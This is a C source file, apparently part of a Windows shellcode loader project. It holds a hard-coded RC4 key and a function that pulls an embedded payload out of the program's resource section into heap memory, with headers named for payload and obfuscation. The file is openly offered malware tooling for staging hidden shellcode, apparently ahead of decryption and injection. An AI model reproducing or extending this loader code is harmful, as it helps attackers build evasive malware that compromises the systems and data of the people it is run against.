#include "payload.h"
#include "obfuscation.h"

// payload.c
unsigned char Rc4Key[] = { 0x6F, 0x6E, 0x6C, 0x79, 0x6F, 0x6E, 0x65, 0x69, 0x6E, 0x6A, 0x65, 0x63, 0x74, 0x01, 0x00, 0x05 };

BOOL GetPayloadRSRC(OUT PVOID* ShellPayload, OUT PSIZE_T sizePayload) {

	HRSRC           hRsrc = NULL;
	HGLOBAL         hGlobal = NULL;
	PVOID           pPayload = NULL;
	SIZE_T          sPayload = 0;
	PVOID			Buffer = NULL;

	// Get Location Data Store Resource
	hRsrc = FindResourceA(NULL, MAKEINTRESOURCE(IDR_RCDATA1), RT_RCDATA);
	if (hRsrc == NULL) {
		printf("Error FindResourceA: %d \n", GetLastError());
		return FALSE;
	}

	// Handle of the resource data
	hGlobal = LoadResource(NULL, hRsrc);
	if (hGlobal == NULL) {
		printf("Error LoadResource: %d \n", GetLastError());
		return FALSE;
	}

	// Get pointer to specified data of the resource (Payload)

	pPayload = LockResource(hGlobal);
	if (pPayload == NULL) {
		printf("Error LockResource: %d \n", GetLastError());
		return FALSE;
	}

	// Get Size of Payload
	sPayload = SizeofResource(NULL, hRsrc);
	if (sPayload == NULL) {
		printf("Error SizeofResource: %d \n", GetLastError());
		return FALSE;
	}

	// Now go backup to data from rsrc.
	Buffer = HeapAlloc(GetProcessHeap(), 0, sPayload);
	if (Buffer != NULL) {
		memcpy(Buffer, pPayload, sPayload);
	}

	// Saved it 
	*ShellPayload = Buffer;
	*sizePayload = sPayload;

	// Recheck
	if (*ShellPayload == NULL || *sizePayload == NULL)
		return FALSE;

	return TRUE;
}